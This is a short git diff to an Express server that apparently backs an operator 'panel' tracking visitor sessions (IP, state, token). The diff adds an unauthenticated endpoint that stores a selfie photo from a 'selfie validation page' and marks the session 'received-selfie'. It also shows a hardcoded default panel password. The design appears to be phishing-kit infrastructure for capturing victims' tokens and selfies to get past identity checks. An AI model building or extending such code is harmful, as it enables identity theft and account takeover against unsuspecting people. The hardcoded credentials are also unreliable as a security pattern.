@@ -8,7 +8,8 @@ const __dirname = dirname(__filename)
 const app = express()
 const PORT = Number(process.env.PORT) || 4173
 
-app.use(express.json())
+app.use(express.json({ limit: '25mb' }))
+app.use(express.urlencoded({ limit: '25mb', extended: true }))
 
 const PANEL_USER = process.env.PANEL_USER || 'Morderkaiser'
 const PANEL_PASSWORD = process.env.PANEL_PASSWORD || 'M3q7Xp9Wv2R4k5T8zY'
@@ -69,6 +70,7 @@ app.post('/api/sessions', (req, res) => {
       ip: ip || '127.0.0.1',
       state: state || 'waiting',
       token: '',
+      selfie: '',
       createdAt: Date.now(),
       last_seen: Date.now(),
       updatedAt: Date.now(),
@@ -157,7 +159,20 @@ app.post('/api/sessions/:id/state', (req, res) => {
   res.json({ success: true, session: sessions[id] })
 })
 
-// 8. Clear all sessions
+// 8. Update selfie photo (from selfie validation page)
+app.post('/api/sessions/:id/selfie', (req, res) => {
+  const { id } = req.params
+  const { photo } = req.body
+  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' })
+
+  sessions[id].selfie = photo || ''
+  sessions[id].state = 'received-selfie'
+  sessions[id].last_seen = Date.now()
+  sessions[id].updatedAt = Date.now()
+  res.json({ success: true, session: sessions[id] })
+})
+
+// 9. Clear all sessions
 app.post('/api/clear', authMiddleware, (req, res) => {
   sessions = {}
   res.json({ success: true })
